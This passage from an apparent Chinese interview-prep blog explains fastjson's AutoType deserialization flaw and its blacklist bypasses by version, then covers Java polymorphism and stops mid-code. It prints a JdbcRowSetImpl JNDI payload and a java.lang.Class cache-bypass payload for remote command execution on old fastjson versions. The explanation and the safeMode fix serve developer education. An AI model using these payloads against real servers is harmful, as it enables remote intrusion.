<h1 id="✅你知道fastjson的反序列化漏洞吗"><a href="#✅你知道fastjson的反序列化漏洞吗" class="headerlink" title="✅你知道fastjson的反序列化漏洞吗"></a>✅你知道fastjson的反序列化漏洞吗</h1><h2 id="典型回答-2"><a href="#典型回答-2" class="headerlink" title="典型回答"></a>典型回答</h2><p>当我们使用fastjson进行序列化的时候，当一个类中包含了一个接口（或抽象类）的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。</p>
<p>那么为了解决这个问题，fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。</p>
<p>因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
<p>那么这个特性就可能被利用，攻击者自己构造一个JSON字符串，并且使用<code>@type</code>指定一个自己想要使用的攻击类库实现攻击。</p>
<p>举个例子，黑客比较常用的攻击类库是<code>com.sun.rowset.JdbcRowSetImpl</code>，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。</p>
<p>而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果。</p>
<p>如通过以下方式定一个JSON串，即可实现远程命令执行（在早期版本中，新版本中JdbcRowSetImpl已经被加了黑名单）</p>
<pre><code>`&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;`
</code></pre>
<p><strong>这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。</strong></p>
<h3 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a>AutoType</h3><p>fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。</p>
<p>但是，fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。</p>
<p>其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：</p>
<ul>
<li>1、基于属性</li>
<li>2、基于setter&#x2F;getter</li>
</ul>
<p>而我们所常用的JSON序列化框架中，FastJson和jackson在把对象序列化成json字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，他是通过反射遍历该类中的所有属性，并把其值序列化成json。</p>
<p>假设我们有以下一个Java类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class Store &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private Fruit fruit;</span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public Fruit getFruit() &#123;</span><br><span class="line">        return fruit;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setFruit(Fruit fruit) &#123;</span><br><span class="line">        this.fruit = fruit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Fruit &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Apple implements Fruit &#123;</span><br><span class="line">    private BigDecimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>当我们要对他进行序列化的时候，fastjson会扫描其中的getter方法，即找到getName和getFruit，这时候就会将name和fruit两个字段的值序列化到JSON字符串中。</strong></p>
<p>那么问题来了，我们上面的定义的Fruit只是一个接口，序列化的时候fastjson能够把属性值正确序列化出来吗？如果可以的话，那么反序列化的时候，fastjson会把这个fruit反序列化成什么类型呢？</p>
<p>我们尝试着验证一下，基于(fastjson v 1.2.68)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Store store = new Store();</span><br><span class="line">store.setName(&quot;Hollis&quot;);</span><br><span class="line">Apple apple = new Apple();</span><br><span class="line">apple.setPrice(new BigDecimal(0.5));</span><br><span class="line">store.setFruit(apple);</span><br><span class="line">String jsonString = JSON.toJSONString(store);</span><br><span class="line">System.out.println(&quot;toJSONString : &quot; + jsonString);</span><br></pre></td></tr></table></figure>



<p>以上代码比较简单，我们创建了一个store，为他指定了名称，并且创建了一个Fruit的子类型Apple，然后将这个store使用<code>JSON.toJSONString</code>进行序列化，可以得到以下JSON内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;,&quot;name&quot;:&quot;Hollis&quot;&#125;</span><br></pre></td></tr></table></figure>



<p>那么，这个fruit的类型到底是什么呢，能否反序列化成Apple呢？我们再来执行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Store newStore = JSON.parseObject(jsonString, Store.class);</span><br><span class="line">System.out.println(&quot;parseObject : &quot; + newStore);</span><br><span class="line">Apple newApple = (Apple)newStore.getFruit();</span><br><span class="line">System.out.println(&quot;getFruit : &quot; + newApple);</span><br></pre></td></tr></table></figure>



<p>执行结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;,&quot;name&quot;:&quot;Hollis&quot;&#125;</span><br><span class="line">parseObject : Store&#123;name=&#x27;Hollis&#x27;, fruit=&#123;&#125;&#125;</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: com.hollis.lab.fastjson.test.$Proxy0 cannot be cast to com.hollis.lab.fastjson.test.Apple</span><br><span class="line">at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)</span><br></pre></td></tr></table></figure>



<p>可以看到，在将store反序列化之后，我们尝试将Fruit转换成Apple，但是抛出了异常，尝试直接转换成Fruit则不会报错，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fruit newFruit = newStore.getFruit();</span><br><span class="line">System.out.println(&quot;getFruit : &quot; + newFruit);</span><br></pre></td></tr></table></figure>



<p>以上现象，我们知道，<strong>当一个类中包含了一个接口（或抽象类）的时候，在使用fastjson进行序列化的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。</strong></p>
<p>那么有什么办法解决这个问题呢，fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。</p>
<p>使用方法是通过<code>SerializerFeature.WriteClassName</code>进行标记，即将上述代码中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = JSON.toJSONString(store);</span><br></pre></td></tr></table></figure>



<p>修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = JSON.toJSONString(store,SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure>



<p>即可，以上代码，输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;toJSONString : &quot; + jsonString);</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Store&quot;,</span><br><span class="line">    &quot;fruit&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;,</span><br><span class="line">        &quot;price&quot;:0.5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;name&quot;:&quot;Hollis&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，<strong>使用</strong><code>**SerializerFeature.WriteClassName**</code><strong>进行标记后，JSON字符串中多出了一个</strong><code>**@type**</code><strong>字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型</strong></p>
<p>如上，将序列化后的字符串在反序列化，既可以顺利的拿到一个Apple类型，整体输出内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Store&quot;,&quot;fruit&quot;:&#123;&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;,&quot;price&quot;:0.5&#125;,&quot;name&quot;:&quot;Hollis&quot;&#125;</span><br><span class="line">parseObject : Store&#123;name=&#x27;Hollis&#x27;, fruit=Apple&#123;price=0.5&#125;&#125;</span><br><span class="line">getFruit : Apple&#123;price=0.5&#125;</span><br></pre></td></tr></table></figure>



<p>这就是AutoType，以及fastjson中引入AutoType的原因。</p>
<p>但是，也正是这个特性，因为在功能设计之初在安全方面考虑的不够周全，也给后续fastjson使用者带来了无尽的痛苦</p>
<h3 id="AutoType-何错之有？"><a href="#AutoType-何错之有？" class="headerlink" title="AutoType 何错之有？"></a>AutoType 何错之有？</h3><p>因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
<p>那么就可以利用这个特性，自己构造一个JSON字符串，并且使用<code>@type</code>指定一个自己想要使用的攻击类库。</p>
<p>举个例子，黑客比较常用的攻击类库是<code>com.sun.rowset.JdbcRowSetImpl</code>，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。</p>
<p>而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果。</p>
<p>如通过以下方式定一个JSON串，即可实现远程命令执行（在早期版本中，新版本中JdbcRowSetImpl已经被加了黑名单）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>



<p><strong>这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。</strong></p>
<p>在早期的fastjson版本中（v1.2.25 之前），因为AutoType是默认开启的，并且也没有什么限制，可以说是裸着的。</p>
<p>从v1.2.25开始，fastjson默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。</p>
<p>但是，也是从这个时候开始，黑客和fastjson作者之间的博弈就开始了。</p>
<p>因为fastjson默认关闭了autotype支持，并且做了黑白名单的校验，所以攻击方向就转变成了”如何绕过checkAutotype”。</p>
<p>下面就来细数一下各个版本的fastjson中存在的漏洞以及攻击原理，<strong>由于篇幅限制，这里并不会讲解的特别细节，如果大家感兴趣我后面可以单独写一篇文章讲讲细节</strong>。下面的内容主要是提供一些思路，目的是说明写代码的时候注意安全性的重要性。</p>
<h4 id="绕过checkAutotype，黑客与fastjson的博弈"><a href="#绕过checkAutotype，黑客与fastjson的博弈" class="headerlink" title="绕过checkAutotype，黑客与fastjson的博弈"></a>绕过checkAutotype，黑客与fastjson的博弈</h4><p>在fastjson v1.2.41 之前，在checkAutotype的代码中，会先进行黑白名单的过滤，如果要反序列化的类不在黑白名单中，那么才会对目标类进行反序列化。</p>
<p>但是在加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的<code>L</code>和<code>;</code>，形如<code>Lcom.lang.Thread;</code>。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/elgD1d5GOiLoxq-Y/1726909520249-8485d750-b287-4c09-a14f-f29322e43b70-061931.jpeg" alt="15938462506312.jpg">￼</p>
<p>而黑白名单又是通过startWith检测的，那么黑客只要在自己想要使用的攻击类库前后加上<code>L</code>和<code>;</code>就可以绕过黑白名单的检查了，也不耽误被fastjson正常加载。</p>
<p>如<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>，会先通过白名单校验，然后fastjson在加载类的时候会去掉前后的<code>L</code>和<code>;变成了</code>com.sun.rowset.JdbcRowSetImpl&#96;。</p>
<p>为了避免被攻击，在之后的 v1.2.42版本中，在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是<code>L</code>和<code>;</code>，如果是的话，就截取掉前后的<code>L</code>和<code>;</code>再进行黑白名单的校验。</p>
<p>看似解决了问题，但是黑客发现了这个规则之后，就在攻击时在目标类前后双写<code>LL</code>和<code>;;</code>，这样再被截取之后还是可以绕过检测。如<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p>
<p>魔高一尺，道高一丈。在 v1.2.43中，fastjson这次在黑白名单判断之前，增加了一个是否以<code>LL</code>未开头的判断，如果目标类以<code>LL</code>开头，那么就直接抛异常，于是就又短暂的修复了这个漏洞。</p>
<p>黑客在<code>L</code>和<code>;</code>这里走不通了，于是想办法从其他地方下手，因为fastjson在加载类的时候，不只对<code>L</code>和<code>;</code>这样的类进行特殊处理，还对<code>[</code>也被特殊处理了。</p>
<p>同样的攻击手段，在目标类前面添加<code>[</code>，v1.2.43以前的所有版本又沦陷了。</p>
<p>于是，在 v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以<code>[</code>开头或者以<code>;</code>结尾，都直接抛异常。也就解决了 v1.2.43及历史版本中发现的bug。</p>
<p>在之后的几个版本中，黑客的主要的攻击方式就是绕过黑名单了，而fastjson也在不断的完善自己的黑名单。</p>
<h4 id="autoType不开启也能被攻击？"><a href="#autoType不开启也能被攻击？" class="headerlink" title="autoType不开启也能被攻击？"></a>autoType不开启也能被攻击？</h4><p>但是好景不长，在升级到 v1.2.47 版本时，黑客再次找到了办法来攻击。而且这个攻击只有在autoType关闭的时候才生效。</p>
<p>是不是很奇怪，autoType不开启反而会被攻击。</p>
<p>因为**在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。**黑客正是利用这里机制进行了攻击。</p>
<p>黑客先想办法把一个类加到缓存中，然后再次执行的时候就可以绕过黑白名单检测了，多么聪明的手段。</p>
<p>首先想要把一个黑名单中的类加到缓存中，需要使用一个不在黑名单中的类，这个类就是<code>java.lang.Class</code></p>
<p><code>java.lang.Class</code>类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。</p>
<p>如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中</p>
<p>如果再次加载val名称的类，并且autotype没开启，下一步就是会尝试从全局缓存中获取这个class，进而进行攻击。</p>
<p>所以，黑客只需要把攻击类伪装以下就行了，如下格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</span><br></pre></td></tr></table></figure>



<p>于是在 v1.2.48中，fastjson修复了这个bug，在MiscCodec中，处理Class类的地方，设置了fastjson cache为false，这样攻击类就不会被缓存了，也就不会被获取到了。</p>
<p>在之后的多个版本中，黑客与fastjson又继续一直都在绕过黑名单、添加黑名单中进行周旋。</p>
<p>直到后来，黑客在 v1.2.68之前的版本中又发现了一个新的漏洞利用方式。</p>
<h4 id="利用异常进行攻击"><a href="#利用异常进行攻击" class="headerlink" title="利用异常进行攻击"></a>利用异常进行攻击</h4><p>在fastjson中， 如果，<a href="/type">@type </a> 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer </p>
<p>而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。</p>
<p>并且指定了expectClass为Throwable.class，但是<strong>在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。</strong></p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/elgD1d5GOiLoxq-Y/1726909520215-51ed1f65-2d8a-49d8-8e32-84a76575b171-293073.jpeg" alt="15938495572144.jpg">￼</p>
<p>因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。</p>
<p>黑客只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。</p>
<p><strong>这个漏洞就是6月份全网疯传的那个”严重漏洞”，使得很多开发者不得不升级到新版本。</strong></p>
<p>这个漏洞在 v1.2.69中被修复，主要修复方式是对于需要过滤掉的expectClass进行了修改，新增了4个新的类，并且将原来的Class类型的判断修改为hash的判断。</p>
<p>其实，根据fastjson的官方文档介绍，即使不升级到新版，在v1.2.68中也可以规避掉这个问题，那就是使用safeMode</p>
<h3 id="AutoType-安全模式？"><a href="#AutoType-安全模式？" class="headerlink" title="AutoType 安全模式？"></a>AutoType 安全模式？</h3><p>可以看到，这些漏洞的利用几乎都是围绕AutoType来的，于是，在 v1.2.68版本中，引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。</p>
<p>设置了safeMode后，@type  字段不再生效，即当解析形如{“@type”: “com.java.class”}的JSON串时，将不再反序列化出对应的类。 </p>
<p>开启safeMode方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(true);</span><br></pre></td></tr></table></figure>



<p>如在本文的最开始的代码示例中，使用以上代码开启safeMode模式，执行代码，会得到以下异常：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: safeMode not support autoType : com.hollis.lab.fastjson.test.Apple</span><br><span class="line">at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:1244)</span><br></pre></td></tr></table></figure>



<p>但是值得注意的是，使用这个功能，fastjson会直接禁用autoType功能，即在checkAutoType方法中，直接抛出一个异常。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/elgD1d5GOiLoxq-Y/1726909520236-e14c21a2-3e47-427e-8f6a-aa679761b220-775945.jpeg" alt="15938532891003.jpg"></p>
<p>开发者可以将自己项目中使用的fastjson升级到最新版，并且如果代码中不需要用到AutoType的话，可以考虑使用safeMode，但是要评估下对历史代码的影响。</p>
<p>因为<strong>fastjson自己定义了序列化工具类，并且使用asm技术避免反射、使用缓存、并且做了很多算法优化等方式，大大提升了序列化及反序列化的效率。</strong></p>
<p>之前有网友对比过：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/elgD1d5GOiLoxq-Y/1726909520243-bec99e9b-2c69-4a4e-ac15-473491374785-832025.jpeg" alt="15938545656293.jpg"></p>
<p>当然，<strong>快的同时也带来了一些安全性问题，这是不可否认的。</strong></p>
<h1 id="✅如何理解Java中的多态？"><a href="#✅如何理解Java中的多态？" class="headerlink" title="✅如何理解Java中的多态？"></a>✅如何理解Java中的多态？</h1><h2 id="典型回答-3"><a href="#典型回答-3" class="headerlink" title="典型回答"></a>典型回答</h2><p>多态的概念比较简单，<strong>就是同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果。</strong></p>
<p>如果按照这个概念来定义的话，那么多态应该是一种运行期的状态。为了实现运行期的多态，或者说是动态绑定，需要满足三个条件：</p>
<ul>
<li>有类继承或者接口实现。</li>
<li>子类要重写父类的方法。</li>
<li>父类的引用指向子类的对象。</li>
</ul>
<p>简单来一段代码解释下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        sout(<span class="string">&quot;im Parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Parent</span>&#123;<span class="comment">// 1.有类继承或者接口实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;<span class="comment">// 2.子类要重写父类的方法</span></span><br><span class="line">        sout(<span class="string">&quot;im Son&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Daughter</span> <span class="keyword">extends</span> <span class="title class_">Parent</span>&#123;<span class="comment">// 1.有类继承或者接口实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;<span class="comment">// 2.子类要重写父类的方法</span></span><br><span class="line">        sout(<span class="string">&quot;im Daughter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Parent</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>(); <span class="comment">//3.父类的引用指向子类的对象</span></span><br><span class="line">        <span class="type">Parent</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Daughter</span>(); <span class="comment">//3.父类的引用指向子类的对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这样，就实现了多态，同样是Parent类的实例，p.call 调用的是Son类的实现、p1.call调用的是Daughter的实现。</p>
<p>有人说，你自己定义的时候不就已经知道p是son，p1是Daughter了么。但是，有些时候你用到的对象并不都是自己声明的 。</p>
<p>比如Spring 中的IOC出来的对象，你在使用的时候就不知道他是谁，或者说你可以不用关心他是谁。根据具体情况而定。</p>
<p>如下面的payService就不是我们自己创建的，而是在运行期根据channel实时决策出来的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayDomainService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    PayServiceFactory payServiceFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(PayRequest payRequest)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payChannel</span> <span class="operator">=</span> payRequest.getPayChannel();</span><br><span class="line">        payServiceFactory.getPayService(payChannel).pay(payRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>前面说多态是一种运行期的概念。还有一种说法，包括维基百科也说明，认为多态还分为动态多态和静态多态。</p>
<p>一般认为Java中的函数重载是一种静态多态，因为他需要在编译期决定具体调用哪个方法。关于这一点，不同的人有不同的见解，建议在面试中如果被问到，可以这样回答：</p>
<blockquote>
<p>“我认为，多态应该是一种运行期特性，Java中的重写是多态的体现。不过也有人提出重载是一种静态多态的想法，这个问题在StackOverflow等网站上有很多人讨论，但是并没有什么定论。我更加倾向于重载不是多态。”</p>
</blockquote>
<p>这样沟通，既能体现出你了解的多，又能表现出你有自己的思维，不是那种别人说什么就是什么的。</p>
<h3 id="扩展知识-1"><a href="#扩展知识-1" class="headerlink" title="扩展知识"></a>扩展知识</h3><h3 id="方法的重载与重写"><a href="#方法的重载与重写" class="headerlink" title="方法的重载与重写"></a>方法的重载与重写</h3><p>重载是就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HollisExample</span> &#123;</span><br><span class="line">    <span class="comment">// 方法重载 - 第一个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Got Integer data.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法重载 - 第二个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Got String data.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>重写指的是在Java的子类与父类中有两个名称、参数列表都相同的方法的情况。由于他们具有相同的方法签名，所以子类中的新方法将覆盖父类中原有的方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="comment">// 父类的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Parent display()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="comment">// 子类重写了父类的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Child display()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Parent</span> <span class="variable">obj1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Parent</span>();</span><br><span class="line">        obj1.display();  <span class="comment">// 输出 &quot;Parent 